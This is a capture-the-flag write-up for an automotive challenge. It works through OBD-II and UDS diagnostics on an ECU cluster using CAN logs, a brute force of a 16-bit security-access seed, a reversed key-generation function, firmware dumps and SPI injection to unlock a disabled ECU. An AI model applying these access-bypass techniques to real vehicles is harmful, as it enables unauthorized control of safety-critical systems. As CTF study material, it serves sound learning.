# Auto-psy
Our previous experiment proves that the DeLorean is indeed a functional time machine; we need to recover the secrets behind this technology. Our technicians successfully isolated the cluster of ECUs containing the time travel technology. We have also found a data SDcard connected to the cluster. The data, however, is encrypted - and that’s where you come in. We need you to obtain access and extract the secret key which must be stored somewhere inside the ECUs. This ECU cluster appears to contain only one microprocessing unit. We believe this unit contains the functionality of several ECUs, together with a gateway, or gateways, managing traffic between the relevant interfaces. The bus containing the cluster also included a legacy external OBD-II port, which we believe may have been used by vehicle mechanics for diagnostic purposes.
Note that the vehicle dashboard is probably no longer of use at this point.

Best of luck.

Challenge developed by Argus Cyber Security.

## Write-up
This was the last CAN challenge and it was interesting to learn about OBD-II and UDS protocols. In a first version it had a bug and didn't reply the flag. The second version with the bug fixed, also added some extra difficulty...

### First version (buggy)
- The first step was log the packets in CAN BUS. We can find these:
```
-> ID: 0x7DF  DLC: 8  Data: 0x02 0x01 0x00 0x00 0x00 0x00 0x00 0x00 (also with ID 0x7E5)
<- ID: 0x7ED  DLC: 8  Data: 0x06 0x41 0x00 0x00 0x08 0x00 0x03 0x00 
Meaning: Show current Data PID 00 (Supported PIDs 01-20) = Active PIDs... 0D, 1F, 20	

-> ID: 0x7DF  DLC: 8  Data: 0x02 0x01 0x20 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7ED  DLC: 8  Data: 0x06 0x41 0x20 0x00 0x00 0x00 0x01 0x00  
Meaning: Show Current Data PID 20 (Supported PIDs 21-40) = Active PIDs... 40

-> ID: 0x7DF  DLC: 8  Data: 0x02 0x01 0x40 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7ED  DLC: 8  Data: 0x06 0x41 0x40 0x40 0x00 0x00 0x10 0x00  
meaning: Show Current Data PID 40 (Supported PIDs 41-60) = Active PIDs... 42, 4A, 64

-> ID: 0x7E5  DLC: 8  Data: 0x02 0x01 0x0D 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7ED  DLC: 8  Data: 0x03 0x41 0x0D 0x8D 0x00 0x00 0x00 0x00
Meaning: Show current Data PID 0D (Vehicle speed) = 0x8D = 141 km/h
	
-> ID: 0x7DF  DLC: 8  Data: 0x02 0x01 0x42 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7ED  DLC: 8  Data: 0x04 0x41 0x42 0x2E 0xE0 0x00 0x00 0x00
Meaning: Show Current Data PID 42 (Control module voltage) = 0x2EE0/1000 = 12V
	
-> ID: 0x7E5  DLC: 8  Data: 0x02 0x09 0x00 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7ED  DLC: 8  Data: 0x06 0x49 0x00 0x40 0x40 0x00 0x00 0x00
Meaning: Request vehicle information PID 00  (Supported PIDs) = Active PIDs... 02, 0A

-> ID: 0x7E5  DLC: 8  Data: 0x02 0x09 0x0A 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7ED  DLC: 8  Data: 0x10 0x16 0x49 0x0A 0x50 0x77 0x72 0x54
<- ID: 0x7ED  DLC: 8  Data: 0x21 0x72 0x61 0x69 0x6E 0x5F 0x43 0x74
<- ID: 0x7ED  DLC: 8  Data: 0x22 0x72 0x6C 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7ED  DLC: 8  Data: 0x23 0x00 0x00 0x00 0x00 0x00 0x00 0x00
Meaning: Request vehicle information PID 0A (ECU name) = PwrTrain_Ctrl
```
- We see some packets sent to ID 7E5 or 7DF(broadcast) and the answers from 7ED

- We can do some tests sending packets to ID 7DF(broadcast) to see who reply:
```
Show current Data PID 00 (Supported PIDs 01-20)
-> ID: 0x7DF  DLC: 8  Data: 0x02 0x01 0x00 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7E8  DLC: 8  Data: 0x06 0x41 0x00 0x00 0x00 0x00 0x02 0x00 -> PID 1F
<- ID: 0x7DB  DLC: 8  Data: 0x06 0x41 0x00 0x00 0x00 0x00 0x02 0x00 -> PID 1F
<- ID: 0x7ED  DLC: 8  Data: 0x06 0x41 0x00 0x00 0x08 0x00 0x03 0x00 -> PID 0D, 1F, 20
	
PID 1F (Run time since engine start)
-> ID: 0x7DF   DLC: 8  Data: 0x02 0x01 0x1F 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7E8   DLC: 8  Data: 0x04 0x41 0x1F 0x0F 0x01 0x00 0x00 0x00 -> 3841 seconds
<- ID: 0x7DB   DLC: 8  Data: 0x04 0x41 0x1F 0x0F 0x01 0x00 0x00 0x00 -> 3841 seconds
<- ID: 0x7ED   DLC: 8  Data: 0x04 0x41 0x1F 0x0F 0x01 0x00 0x00 0x00 -> 3841 seconds

Request vehicle information PID 00  (Supported PIDs)	
-> ID: 0x7DF  DLC: 8  Data: 0x02 0x09 0x00 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7E8  DLC: 8  Data: 0x06 0x49 0x00 0x40 0x40 0x00 0x00 0x00 -> PID 02, 0A
<- ID: 0x7DB  DLC: 8  Data: 0x06 0x49 0x00 0x40 0x40 0x00 0x00 0x00 -> PID 02, 0A
<- ID: 0x7ED  DLC: 8  Data: 0x06 0x49 0x00 0x40 0x40 0x00 0x00 0x00 -> PID 02, 0A

PID 0A (ECU name)
-> ID: 0x7DF  DLC: 8  Data: 0x02 0x09 0x0A 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7E8  DLC: 8  Data: 0x10 0x16 0x49 0x0A 0x46 0x6C 0x78 0x43 -> FlxCap_Gateway
<- ID: 0x7E8  DLC: 8  Data: 0x21 0x61 0x70 0x5F 0x47 0x61 0x74 0x65
<- ID: 0x7E8  DLC: 8  Data: 0x22 0x77 0x61 0x79 0x00 0x00 0x00 0x00
<- ID: 0x7E8  DLC: 8  Data: 0x23 0x00 0x00 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7DB  DLC: 8  Data: 0x10 0x16 0x49 0x0A 0x46 0x6C 0x78 0x43 -> FlxCap_Ctrl
<- ID: 0x7DB  DLC: 8  Data: 0x21 0x61 0x70 0x5F 0x43 0x74 0x72 0x6C
<- ID: 0x7DB  DLC: 8  Data: 0x22 0x00 0x00 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7DB  DLC: 8  Data: 0x23 0x00 0x00 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7ED  DLC: 8  Data: 0x10 0x16 0x49 0x0A 0x50 0x77 0x72 0x54 -> PwrTrain_Ctrl
<- ID: 0x7ED  DLC: 8  Data: 0x21 0x72 0x61 0x69 0x6E 0x5F 0x43 0x74
<- ID: 0x7ED  DLC: 8  Data: 0x22 0x72 0x6C 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7ED  DLC: 8  Data: 0x23 0x00 0x00 0x00 0x00 0x00 0x00 0x00

PID 02 (Vehicle Identification Number (VIN))
-> ID: 0x7DF  DLC: 8  Data: 0x02 0x09 0x02 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7ED  DLC: 8  Data: 0x10 0x13 0x49 0x02 0x4C 0x4A 0x43 0x50 -> LJC PCBLCX 11000237
<- ID: 0x7ED  DLC: 8  Data: 0x21 0x43 0x42 0x4C 0x43 0x58 0x31 0x31
<- ID: 0x7ED  DLC: 8  Data: 0x22 0x30 0x30 0x30 0x32 0x33 0x37 0x00
<- ID: 0x7DB  DLC: 8  Data: 0x10 0x13 0x49 0x02 0x4C 0x4A 0x43 0x50 -> LJC PCBLCX 11000237
<- ID: 0x7DB  DLC: 8  Data: 0x21 0x43 0x42 0x4C 0x43 0x58 0x31 0x31
<- ID: 0x7DB  DLC: 8  Data: 0x22 0x30 0x30 0x30 0x32 0x33 0x37 0x00
<- ID: 0x7E8  DLC: 8  Data: 0x10 0x13 0x49 0x02 0x4C 0x4A 0x43 0x50 -> LJC PCBLCX 11000237
<- ID: 0x7E8  DLC: 8  Data: 0x21 0x43 0x42 0x4C 0x43 0x58 0x31 0x31
<- ID: 0x7E8  DLC: 8  Data: 0x22 0x30 0x30 0x30 0x32 0x33 0x37 0x00
```
- There are three ECUs that reply the broadcast packets
  - ID 0x7DB (0x7D3)
  - ID 0x7E8 (0x7E0)
  - ID 0x7ED (0x7E5)
	
- We can scan the active services in each ECU (from 00 to FF). Most of them will give us error code 0x11 (Service Not Supported). These are the services with different answer
```
FlxCap_Gateway (7E0)
<- ID: 0x7E8  DLC: 8  Data: 0x03 0x7F 0x10 0x12 0x00 0x00 0x00 0x00 -> Sub Function Not Supported - Invalid Format
<- ID: 0x7E8  DLC: 8  Data: 0x03 0x7F 0x11 0x12 0x00 0x00 0x00 0x00 -> Sub Function Not Supported - Invalid Format
<- ID: 0x7E8  DLC: 8  Data: 0x03 0x7F 0x27 0x22 0x00 0x00 0x00 0x00 -> Conditions Not Correct Or Request Sequence Error
<- ID: 0x7E8  DLC: 8  Data: 0x03 0x7F 0x35 0x33 0x00 0x00 0x00 0x00 -> Security Access Denied - security Access Requested
<- ID: 0x7E8  DLC: 8  Data: 0x03 0x7F 0x36 0x24 0x00 0x00 0x00 0x00 -> Request Sequence Error
<- ID: 0x7E8  DLC: 8  Data: 0x03 0x7F 0x37 0x13 0x00 0x00 0x00 0x00 -> Incorrect message length or invalid format
```
```
PwrTrain_Ctrl (7E5)
<- ID: 0x7ED  DLC: 8  Data: 0x03 0x7F 0x10 0x12 0x00 0x00 0x00 0x00 -> Sub Function Not Supported - Invalid Format
<- ID: 0x7ED  DLC: 8  Data: 0x03 0x7F 0x11 0x12 0x00 0x00 0x00 0x00 -> Sub Function Not Supported - Invalid Format
<- ID: 0x7ED  DLC: 8  Data: 0x03 0x7F 0x27 0x22 0x00 0x00 0x00 0x00 -> Conditions Not Correct Or Request Sequence Error
```
```
FlxCap_Ctrl (7D3)
<- ID: 0x7DB  DLC: 8  Data: 0x03 0x7F 0x10 0x12 0x00 0x00 0x00 0x00 -> Sub Function Not Supported - Invalid Format
<- ID: 0x7DB  DLC: 8  Data: 0x03 0x7F 0x11 0x12 0x00 0x00 0x00 0x00 -> Sub Function Not Supported - Invalid Format
<- ID: 0x7DB  DLC: 8  Data: 0x03 0x7F 0x27 0x22 0x00 0x00 0x00 0x00 -> Conditions Not Correct Or Request Sequence Error
<- ID: 0x7DB  DLC: 8  Data: 0x03 0x7F 0x35 0x33 0x00 0x00 0x00 0x00 -> Security Access Denied - security Access Requested
<- ID: 0x7DB  DLC: 8  Data: 0x03 0x7F 0x36 0x24 0x00 0x00 0x00 0x00 -> Request Sequence Error
<- ID: 0x7DB  DLC: 8  Data: 0x03 0x7F 0x37 0x13 0x00 0x00 0x00 0x00 -> Incorrect message length or invalid format
<- ID: 0x7DB  DLC: 8  Data: 0x03 0x7F 0xA0 0x33 0x00 0x00 0x00 0x00 -> Security Access Denied - security Access Requested
```
- The meaning of the active services:
  - Service 10 = Start Diagnostic Session
  - Service 11 = ECU Reset
  - Service 27 = Security Access
  - Service 35 = Request Upload
  - Service 36 = Transfer data
  - Service 37 = Request transfer exit
  - Service A0: ¿?
- First interesting service (and required to enable the others) is the 27
``` 
It requires before the packet for service 10
Later, when we request challenge we receive
<- ID: 0x7E8       DLC: 8  Data: 0x04 0x67 0x01 0xFA 0x33 0x00 0x00 0x00
	
The challenge has only 16 bits, so it is possible to bruteforce it. We can select a fixed value (for example 1234) and try to login many times. After a seconds we will have correct login (when challenge was 1C03). 
<- ID: 0x7E8  DLC: 8  Data: 0x03 0x7F 0x27 0x35 0x00 0x00 0x00 0x00 -> Invalid Key
<- ID: 0x7E8  DLC: 8  Data: 0x02 0x67 0x02 0x00 0x00 0x00 0x00 0x00 -> Login OK

Some valid challenge-responses
	case 0x103C: key = 0x0234;
	case 0x1C03: key = 0x1234;
	case 0x11C2: key = 0x1235;
	case 0x28CD: key = 0x4632;
	case 0xC342: key = 0x1234;
```
- After a valid login, we can try to read the service A0 of ID 07D3 and we will obtain...
```
<- ID: 0x7DB       DLC: 8  Data: 0x10 0x29 0xE0 0x00 0x46 0x4C 0x41 0x47
<- ID: 0x7DB       DLC: 8  Data: 0x21 0x3A 0x00 0x06 0x00 0x00 0x00 0x00
<- ID: 0x7DB       DLC: 8  Data: 0x22 0x00 0x10 0x32 0x05 0x00 0x00 0x00
<- ID: 0x7DB       DLC: 8  Data: 0x23 0x00 0x00 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7DB       DLC: 8  Data: 0x24 0x00 0x00 0x00 0x00 0x00 0x00 0x00
<- ID: 0x7DB       DLC: 8  Data: 0x25 0x00 0x00 0x00 0x00 0x00 0x00 0x00
	
E000 464C41473A 0006 0000 0000 0010 3205 0000000000000000000000000000000000000000000000 (FLAG:)
```
- It should be the flag, but it seems garbage... Testing these values in challenge website we will confirm that it was invalid.

- To try to see what happen I downloaded the firmware using the services 35/36/37 and started to reverse. Here are the dumps of ID [07E0](Dump7E0_buggy.txt) and [07D3](Dump7D3_buggy.txt). While I was reversing the firmware the challenge was disabled because it has some bug and I stopped and waited (for long time...) to the fixed version. To avoid the bruteforce in the login for future tests, I reversed the function to get valid responses.
```cs
int genPass(int challenge)
{
    byte seedPass[] = { 0x45, 0x71, 0x3D, 0x8B, 0x4F, (byte)(challenge >> 8), (byte)(challenge) };
    byte r24 = 0, r25 = 0;
    for (int i = 0; i < 7; i++)
    {
        byte r22 = seedPass[i];
        r24 ^= r22;
        r22 = r24;
        r22 = (r22 << 4) | (r22 >> 4);
        r22 ^= r24;
        byte r0 = r22;
        r22 >>= 1;
        r22 >>= 1;
        r22 ^= r0;
        r0 = r22;
        r22 >>= 1;
        r22 ^= r0;
        r22 &= 0x07;
        r0 = r24;
        r24 = r25;
        int carry1 = r22 & 1;
        int carry2 = r0 & 1;
        r22 >>= 1;
        r0 = (carry1 << 7) | (r0 >> 1);
        r22 = (carry2 << 7) | (r22 >> 1);
        r25 = r0;
        r24 ^= r22;
        carry2 = r0 & 1;
        r0 >>= 1;
        r22 = (carry2 << 7) | (r22 >> 1);
        r25 ^= r0;
        r24 ^= r22;
    }
    if ((byte)(challenge >> 8) == (byte)challenge) return (r25 << 8) + r25;
    else return (r25 << 8) + (r25 ^ 1);
}
```

### Second version (OK)
When the second version was published I thought that I will need only few seconds to get the flag repeating the same steps of first version. I was wrong... this new version hadn't enabled the ID 7D3!!!. IDs 7E0 and 7E5 seems to be equal to first version. 
- We have to dump again the ID 7E0 and reverse it to see what is happening... [here](Dump7E0.txt) is the dump.
- The code to set filter for ID 07D3 only will be executed if the value at address $BFE0 is not 00
```
ROM:0229                 ldi     r30, 0xE0
ROM:022A                 ldi     r31, 0xBF
ROM:022B                 lpm     r30, Z
ROM:022C                 tst     r30
ROM:022D                 breq    loc_239         ; test BFE0 == 0
ROM:022E                 ser     r18
ROM:022F                 ldi     r19, 0xF
ROM:0230                 ldi     r20, 0xD3       ; 07D3
ROM:0231                 ldi     r21, 7
ROM:0232                 ldi     r22, 3
ROM:0233                 lds     r24, 0x200B
ROM:0235                 lds     r25, 0x200C
ROM:0237                 call    WriteRegistersSPI
ROM:0239 loc_239:
```
- If we look the SPI commands with a logic analyzer we can confirm this filter is not set.
- Analyzing the code I didn't find a way to add the filter to 07D3, no exploits, no cmds to enable it, neither trying to reset the MCPs with service 11.

- At this point I asked to an admin if it was part of the challenge or it was another bug. He didn't answer so I had to continue by myself...

- I had two ideas:
  - Try to corrupt some SPI packet wile AT is initializing the MCPs (After a few test I hadn't success)
  - Inject the packets to init the filter 07D3 in the SPI lines. The SPI commands to add this filter should be
```
05 0F E080
02 10 FA600000
02 24 FFE00000
05 0F E000
```
- Looking the schematics and following the SPI lines we have this:
```
MCP.........AT......PIN Board
28 SO   -  AT16  -  no
27 SI   -  AT15  -  D10
26 SCK  -  AT17  -  no
1  CS   -  AT14  -  D9
```
- I connected the Arduino to D10(SI), D9(CS) and I touched with another wire the AT pin 17 (SCK). With the arduino I inserted the SPI messages and I enabled ID 07D3. After this we can do login and read the service A0
```
ID: 0x7DB  DLC: 8  Data: 10 23 E0 00 46 4C 41 47
ID: 0x7DB  DLC: 8  Data: 21 3A 00 26 5F 25 5E 50
ID: 0x7DB  DLC: 8  Data: 22 72 30 67 6E 6F 35 69
ID: 0x7DB  DLC: 8  Data: 23 73 20 3D 20 21 31 75
ID: 0x7DB  DLC: 8  Data: 24 70 75 35 5E 23 3A 33
ID: 0x7DB  DLC: 8  Data: 25 00 00 00 00 00 00 00
```
- Flag:
```
&_%^Pr0gno5is = !1upu5^#:3
```
- Another way to see the flag is dump the data of 7D3 with services 35/36/37 from 8000 to BFFF. [Here](Dump7D3.txt) is the dump of this ID.

### Scripts
- Script to scan active services [here](AutoPSY_scan.ino)
- Script to login and dump [here](AutoPSY_loginDump.ino)
- Script to enable7D3, login and read flag [here](AutoPSY_readFlag.ino)
  

